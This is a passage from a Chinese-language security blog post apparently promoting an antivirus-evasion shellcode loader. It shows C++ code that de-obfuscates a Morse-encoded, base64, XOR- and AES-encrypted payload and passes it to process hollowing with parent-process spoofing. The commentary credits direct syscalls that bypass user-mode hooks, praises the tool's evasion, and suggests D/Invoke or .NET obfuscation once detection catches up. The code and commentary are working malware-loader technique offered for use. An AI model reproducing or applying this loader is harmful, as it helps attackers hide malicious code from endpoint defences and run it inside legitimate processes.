    std::vector<uint8_t> isbgdapqeicaw, nxllkgwilgr;
    std::string gnjtbnfmobyh, ttkmjqver, gdfmssmkalh, ybhpdxsg, khlrlybj, gnjtbnfmobyhybhpdxsg, gnjtbnfmobyhkhlrlybj, gnjtbnfmobyhowwrtclyellkn, owwrtclyellkn;
    base64 b64 = base64();

    //xor
    gnjtbnfmobyh = "^- ^-... ^--.. .. ---.. ^-.. --. .---- .... ^-..- ^-- ----. ^--.- ^. ----. ^.- ^-- ^-.-- ^.-- -.-- ^--.- --... ^--.. -.-- ^-.- ..--- --- ^-.. ...-- .--- ^...- ^-.- -. ----. .--. .- ^-.-. ^-... ^-.- ^-..- ^--- - ^...- ^. ^--. -.-- ^-.- ^.. ---.. .... ..-. --- .... -... ^- ^.. -. -..- ^.. ..-. ^--. ----. ^..- --- ----. ^-..- ----- .-- --... ---.. ^-.- ----. ----- .- ..-. ..-. ..--- ^-.. ^-..- ... ^.-. ^.- ..... .- ^-.-. ^-.- / ^-- -.-- ^.^ ^.-.. -.. ^.--- ^--.. ^- ^.--. ^.--- -.. ^-.-. . ^--- ----- ...- ^... / ^--.. .- ^. ....- ^.- ^--.- ^... ... ^-.-- . ^-..- ^-... ----- . ^.... ... --. ^-.- ^-.- ^.^ ^-.- ^-.- ^.^ --... ^--. ^-.- ^.-- ^-. - .--. -. ^-... ----. -. ---.. ^. -.. -.... -- .-.. -.. ^. ----. - .--- ^... -..- ^-- -..- ^..-. / ^.-.. ..... ^- ^-... .. .--. ^.... ^-. ^.- .-. ^.-- ^. ^-.- ..- ^..-. -..- ....- ... ^.- ^..- ... -.-. ^.-- .--. .-- ....- ^.. .- ^--- ^--.- .. ^..- ----- --. .---- ^-..- .--. --.. ^.... ^.-. ..... ^-... --. ^.-- ---.. ...-- --.- --- --. ^-..- ^. - ..- / ^.... ^-.-- .---- -.. .--. .-. ^-. ^...- ^... ^. .-.. ... ..--- .--- ^-.-- -.-. .-.. - . .--- ...-- ..--- ....- ^..- -.. .-. - ...-- ^. --.. ^-.. ^--.. ^.--. ^- ^.^ ^. ^--.. -.. ^-. ^.-- ^.- .-- -- ^.... -..- ..-. ^-.. .- -.- ^.-- ^.- ... --. ---.. ..... --.- ^.-- ^. ....- ----- ----- -.... --... .-.. ---.. .-- ---.. --.. ----. ^.--. -... .---- ^... ^.... ...-- .-- ^.^ ^..-. ^.-- --- ^-..- --... ^--.- - .-. ^-... -.-. --.. ^-. ^.^ .--. --. ^- ----. .... -..- ^-.-- - -.- ^... .---- .... .--. -.. -.- .---- -..- ^-..- ^.. ..--- --.. . ^--.. -... ^... ^.-. -.... ^-- ^.... ^-.. ^.... -- --... .-.. ^...- ^... ^- -.- ^.-.. ^-- / .--- --- ^.... ..-. ^-.- ...-- --.- ^--.. ^..- ^-... ^.--- ^-.-. -.. -. ^-.-. ^--- .--. .-. ^-.. . .-.. ^--- .--. ... ^-.-. ..... ..-. ..-. ..- ^-- ^.^ --. ..... -... ^--.. ... .---- ^-. ^.- ^-.-. ..--- ^.. ^.-- ";
    gnjtbnfmobyhybhpdxsg = "-.-. . -.... -.-. . ^- ..--- ^-..- .--- ...- ^- ^-- ^... ^... ^... .-.. ----. ----- -.... .- --. ..... -- ..... ^.... -.- ^... ^--.- ..-. ^-... ^-... ^.--- .---- ^--- ..... .- .- / - ... -.-. ^-- ....- ...^- ";
    gnjtbnfmobyhkhlrlybj = ".---- -- ^...- .... ^-.-- --. .... ....- ...- .-- -. ^..-. ^-.-. ^..-. ^.- -... --. ^-.. --- .--. ^... .-- ...^- ...^- ";
    gnjtbnfmobyhowwrtclyellkn = "-... ^-.- ^.^ -... -. ^..^ -... .--- ^.^ ^--- ...- .- ^.^ --.- ----- --. --. .... ";

    //translate all sumarine language
    ttkmjqver = idwdcbsjt(gnjtbnfmobyh);
    ybhpdxsg = idwdcbsjt(gnjtbnfmobyhybhpdxsg);
    khlrlybj = idwdcbsjt(gnjtbnfmobyhkhlrlybj);
    owwrtclyellkn = idwdcbsjt(gnjtbnfmobyhowwrtclyellkn);

    gdfmssmkalh = b64.base64_decode(ttkmjqver);

    //xor
    //char qpuqrabc[] = "Sup3rS3cur3K3yfTw!";
    //initialize owwrtclyellkn in a weird way
    char qpuqrabc[19];
    for (int k = 0; k < owwrtclyellkn.length(); k++) qpuqrabc[k] = owwrtclyellkn[k];

    int j = 0;
    for (int i = 0; i < gdfmssmkalh.size(); i++) {
        if (j == sizeof qpuqrabc - 1) j = 0;

        gdfmssmkalh[i] = gdfmssmkalh[i] ^ qpuqrabc[j];
        j++;
    }

    isbgdapqeicaw.clear();
    std::copy(gdfmssmkalh.begin(), gdfmssmkalh.end(), std::back_inserter(isbgdapqeicaw));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32];
    uint8_t iv[16];
    string a3s_key = b64.base64_decode(ybhpdxsg);
    string a3s_iv = b64.base64_decode(khlrlybj);
    std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
    std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));

    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, isbgdapqeicaw.data(), isbgdapqeicaw.size());
    nxllkgwilgr.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = isbgdapqeicaw.size();
    for (int i = 0; i < c_size; i++)
    {
        if (isbgdapqeicaw[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (isbgdapqeicaw[i] == 0x90 && isbgdapqeicaw[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            nxllkgwilgr.push_back(isbgdapqeicaw[i]);
        }
    }

    //process hollowing + pcvhmsvnfo spoofing
    ddrvwpki(nxllkgwilgr);
}
```

然后我们分析一下 CPP 代码，其核心则是 process hollowing + 父进程欺骗

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NjOQnAWcXUHqm7zqFsmJQUZKREoFtVzliaYVtMiavLDDzsmqoAfdTPjAA/640?wx_fmt=png)

不过其使用了底层 api 操作，文章如下：

https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9N1xXLKZrZyHeg2lVnUIrJNglUtMYc2cicNj5iaXFOhXAy3zrIyc60ocaA/640?wx_fmt=png)

其具体汇编代码存储与 asm 文件中

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NiagPQP4GvmtXBXxlH8IgMibhsyyyOP6oWHQyibk451kM6WcOoO1SkaSJw/640?wx_fmt=png)

而代码最前面这些则是针对 shellcode 的加密操作

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NS92Lnu5hwQvYFdDYzYJvexkFLxpiandSMkqH0kkmt6WZ1JCpncF6oUw/640?wx_fmt=png)

**写在后面：**

该工具免杀效果显著，但 C# 版本的某些 api 可能会引起杀软注意，可更换为 D/Invoke，如以后代码效果失效，可尝试构建. net 混淆工具。demo 如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VNtBFFzFt8Nlm4BykDHE9NYAibjoKBGcssLDS5zyxUNAeW1nRUurx01iaWaicmEyIibZ74gBusT7XHww/640?wx_fmt=png)

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)